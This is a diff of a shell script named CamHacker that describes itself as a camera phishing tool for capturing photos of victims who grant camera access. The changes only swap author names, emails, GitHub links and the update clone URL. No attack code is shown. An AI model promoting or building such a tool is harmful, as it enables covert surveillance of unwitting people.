@@ -3,13 +3,13 @@
 # CamHacker
 # Version    : 1.4
 # Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : Satiz
-# Github     : https://github.com/Satiz07
-# Email      : Satizram0709@gmail.com
-# Credits    : 
+# Author     : KasRoudra
+# Github     : https://github.com/KasRoudra
+# Email      : satizram0709@gmail.com
+# Credits    : Noob-Hackers, TechChipNet, LinuxChoice
 # Date       : 5-09-2021
 # License    : MIT
-# Copyright  : Satiz (2023-2024)
+# Copyright  : KasRoudra (2021-2022)
 # Language   : Shell
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -17,7 +17,7 @@
 : '
 MIT License
 
-Copyright (c) 2022 Satiz
+Copyright (c) 2022 KasRoudra
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -73,7 +73,7 @@ ${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
 ${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
 ${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
 ${red}                                            [v${version}]
-${blue}                                    [By Satizram]
+${blue}                                    [By Satiz]
 "
 
 # Package Installer
@@ -441,7 +441,7 @@ if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
         read upask
         printf "$nc"
         if [[ "$upask" == "y" ]]; then
-            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/Satizram07/camera
+            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/KasRoudra/CamHacker
             echo -e "\n${success}CamHacker updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
             echo -e "${purple}[•] Changelog:\n${blue}${changelog}"
@@ -562,14 +562,14 @@ fi
         echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
 $red[Version]    ${cyan} :[${version}]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[SatizRam]
-$red[Github]     ${cyan} :[https://github.com/Satizram07]
-$red[Messenger]  ${cyan} :[https://m.me/Satizram07]
-$red[Email]      ${cyan} :[Satizram0709@gmail.com]"
+$red[Author]     ${cyan} :[KasRoudra]
+$red[Github]     ${cyan} :[https://github.com/KasRoudra]
+$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
+$red[Email]      ${cyan} :[satizram0709@gmail.com]"
         printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
         read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://github.com/Satizram07"
+        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
     elif echo $option | grep -q "0"; then
         echo -e "\n${success}Thanks for using!\n"
         exit 0
